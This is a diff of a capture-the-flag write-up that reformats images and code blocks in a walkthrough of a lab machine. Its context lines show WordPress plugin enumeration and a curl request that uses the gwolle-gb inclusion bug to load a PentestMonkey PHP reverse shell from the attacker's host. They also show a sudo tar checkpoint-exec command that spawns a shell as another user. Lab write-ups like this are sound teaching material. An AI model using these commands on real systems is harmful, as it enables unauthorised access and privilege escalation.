@@ -18,7 +18,7 @@ PORT   STATE SERVICE
 
 The web page only shows this:
 
-<figure><img src="../../../.gitbook/assets/image (1143).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1143).png>)
 
 I checked for `robots.txt`, which is quite common for old machines.
 
@@ -59,7 +59,6 @@ It seems that `robots.txt` left this Wordpress site out. Let's investigate that 
 
 This was a basic Wordpress site with nothing on it. We can run a `wpscan` with the API token to enumerate all the plugins, themes and what not. There are some plugins that are vulnerable:
 
-{% code overflow="wrap" %}
 ```
 $ wpscan --api-token <TOKEN> --url http://10.129.1.185/webservices/wp/ --enumerate p,t,u --plugins-detection aggressive
 
@@ -110,7 +109,6 @@ $ wpscan --api-token <TOKEN> --url http://10.129.1.185/webservices/wp/ --enumera
  | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
  |  - http://10.129.85.106/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 ```
-{% endcode %}
 
 We can search for exploits for these two plugins.
 
@@ -135,7 +133,7 @@ We can grab a PHP reverse shell from PentestMonkey and rename it to `wp-load.php
 $ curl http://10.129.85.109/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.13/
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3994).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3994).png>)
 
 ## Privilege Escalation
 
@@ -184,7 +182,7 @@ From GTFOBins, we can use this command to get a shell as the user:
 sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-<figure><img src="../../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(610).png>)
 
 We can now grab the user flag.
 
